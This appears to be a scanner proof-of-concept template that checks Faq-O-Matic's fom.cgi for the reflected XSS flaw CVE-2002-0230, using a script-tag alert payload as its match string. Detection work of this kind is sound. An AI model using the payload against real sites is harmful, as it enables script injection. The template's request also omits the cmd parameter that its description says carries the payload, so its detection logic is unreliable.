[info]
author = "AVE"
description = "检测 Faq-O-Matic 2.712 的 fom.cgi 是否存在反射型 XSS 漏洞，通过 cmd 参数注入恶意脚本"
id = "POC-AVE-2002-0221"
name = "Faq-O-Matic fom.cgi 跨站脚本攻击 PoC"
severity = "medium"
tags = [
    "cve-2002-0230",
    "xss",
    "faq-o-matic",
]
vuln_id = [
    "CVE-2002-0230",
    "AVE-2002-0221",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/fom/fom.cgi"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ['<script>alert("superpetz")</script>']
